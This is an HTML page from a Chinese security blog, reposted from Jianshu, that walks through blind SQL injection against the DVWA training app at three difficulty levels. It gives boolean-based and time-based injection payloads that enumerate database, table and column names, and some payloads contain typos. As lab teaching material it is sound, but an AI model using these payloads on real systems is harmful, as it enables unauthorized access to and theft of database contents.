@@ -1,0 +1,329 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>DVWA之SQL Injection(Blind)(SQL盲注) | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="DVWA之SQL Injection(Blind)(SQL盲注) | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              DVWA之SQL Injection(Blind)(SQL盲注)
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-03-29
+              </span>
+              <span>
+                12 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <p>SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
+<p>盲注中常用的几个函数：<br>
+substr(a,b,c)：从b位置开始，截取字符串a的c长度<br>
+count()：计算总数<br>
+ascii()：返回字符的ascii码<br>
+length()：返回字符串的长度 left(a,b)：从左往右截取字符串a的前b个字符<br>
+sleep(n):将程序挂起n秒<br>
+注释：     limit为sql查询语句中对于查询范围的限制</p>
+<p>limit a,b 意为查询 a+1~b的所有条目，limit n表示打印前n个条目，等同于limit 0,n,limit a,-1意为查询a+1到最后所有条目</p>
+<p>手工盲注思路</p>
+<p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
+<p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里只演示基于布尔的盲注与基于时间的盲注。</p>
+<p>下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型<br>
+2.猜解当前数据库名<br>
+3.猜解数据库中的表名<br>
+4.猜解表中的字段名<br>
+5.猜解数据</p>
+<pre><code>    1.Low：
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1617018229917.png" alt="" loading="lazy"><br>
+分析：<br>
+Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种：<br>
+User ID exists in the database.‘与‘ User ID is MISSING from the database.<br>
+因此这里是SQL盲注漏洞。</p>
+<p>漏洞利用</p>
+<p>基于布尔的盲注：</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
+<p>输入1，显示相应用户存在：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617018291525.png" alt="" loading="lazy"><br>
+输入1’ and 1=1 #，显示存在：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617018291525.png" alt="" loading="lazy"><br>
+输入1’ and 1=2 #，显示不存在：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617018392849.png" alt="" loading="lazy"><br>
+2.猜解当前数据库名</p>
+<p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
+<pre><code>    输入1’ and length(database())=1 #，显示不存在；
+    输入1’ and length(database())=2 #，显示不存在；
+    输入1’ and length(database())=3 #，显示不存在；
+    输入1’ and length(database())=4 #，显示存在：
+</code></pre>
+<p>说明数据库名长度为4。</p>
+<p>下面采用二分法猜解数据库名。</p>
+<pre><code>    输入1' and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；
+    输入1' and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；
+    输入1' and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；
+    输入1' and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；
+    输入1' and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；
+    输入1' and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。
+    …
+</code></pre>
+<p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p>
+<p>3.猜解数据库中的表名</p>
+<p>首先猜解数据库中表的数量：</p>
+<pre><code>    1' and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在
+    1' and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
+</code></pre>
+<p>说明数据库中共有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<pre><code>    1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在 
+    1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在
+    … 
+    1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
+    说明第一个表名长度为9。
+
+    1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在
+    1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在
+    1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在
+    1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在
+    1' and ascii(substr((select table_name from information_schema.tables where table_schema=data'ase() limit 0,1),1,1))&gt;103 # 显示不存在
+    说明第一个表的名字的第一个字符为小写字母g。
+</code></pre>
+<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
+<p>4.猜解表中的字段名</p>
+<p>首先猜解表中字段的数量：</p>
+<pre><code>    1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在 
+    ...
+    1' and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
+    说明users表有8个字段。
+
+    接着挨个猜解字段名：
+
+    1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在
+    …
+    1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在
+</code></pre>
+<p>说明users表的第一个字段为7个字符长度。</p>
+<p>采用二分法，即可猜解出所有字段名。</p>
+<p>5.猜解数据</p>
+<p>同样采用二分法。</p>
+<p>基于时间的盲注：</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<pre><code>    输入1' and sleep(5) #，感觉到明显延迟；
+    输入1 and sleep(5) #，没有延迟；
+</code></pre>
+<p>说明存在字符型的基于时间的盲注。</p>
+<p>2.猜解当前数据库名</p>
+<p>首先猜解数据名的长度：</p>
+<pre><code>    1' and if(length(database())=1,sleep(5),1) # 没有延迟 1' and if(length(database())=2,sleep(5),1) # 没有延迟 1' and if(length(database())=3,sleep(5),1) # 没有延迟 1' and if(length(database())=4,sleep(5),1) # 明显延迟
+</code></pre>
+<p>说明数据库名长度为4个字符。</p>
+<p>接着采用二分法猜解数据库名：</p>
+<pre><code>    1' and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟 … 1' and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟 1' and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟 说明数据库名的第一个字符为小写字母d。
+    …
+</code></pre>
+<p>重复上述步骤，即可猜解出数据库名。</p>
+<p>3.猜解数据库中的表名</p>
+<p>首先猜解数据库中表的数量：</p>
+<pre><code>    1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟
+    1' and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
+</code></pre>
+<p>说明数据库中有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<pre><code>    1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟
+    …
+    1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
+</code></pre>
+<p>说明第一个表名的长度为9个字符。</p>
+<p>采用二分法即可猜解出表名。</p>
+<p>4.猜解表中的字段名</p>
+<p>首先猜解表中字段的数量：</p>
+<pre><code>    1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟
+    …
+    1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
+</code></pre>
+<p>说明users表中有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<pre><code>    1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟
+    …
+    1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
+</code></pre>
+<p>说明users表的第一个字段长度为7个字符。</p>
+<p>采用二分法即可猜解出各个字段名。</p>
+<p>5.猜解数据</p>
+<pre><code>    2.Medium:
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1617018604104.png" alt="" loading="lazy"></figure>
+<p>分析：<br>
+Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p>
+<p>\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p>
+<p>漏洞利用</p>
+<p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p>
+<p>上文有详细的盲注流程，这里就简要演示几个。</p>
+<p>首先是基于布尔的盲注：</p>
+<p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；<br>
+抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；<br>
+抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。<br>
+然后是基于时间的盲注：</p>
+<p>抓包改参数id为1 and if(length(database())=4,sleep(5),1) #，明显延迟，说明数据库名的长度为4个字符；<br>
+抓包改参数id为1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #，明显延迟，说明数据中的第一个表名长度为9个字符；<br>
+抓包改参数id为1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #，明显延迟，说明uers表有8个字段。<br>
+3.High：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1617018793745.png" alt="" loading="lazy"><br>
+分析：<br>
+High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+<p>漏洞利用</p>
+<p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：</p>
+<p>抓包将cookie中参数id改为1’ and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；<br>
+抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；<br>
+抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p>
+<p>作者：简简的我<br>
+链接：https://www.jianshu.com/p/aedf919d08fb<br>
+来源：简书<br>
+著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+
+              </div>
+              <div class="toc-container">
+                
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/sql-zhu-ru-de-san-chong-fang-shi-shi-shi-me/">
+              <h3 class="post-title">
+                sql注入的三种方式是什么？
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
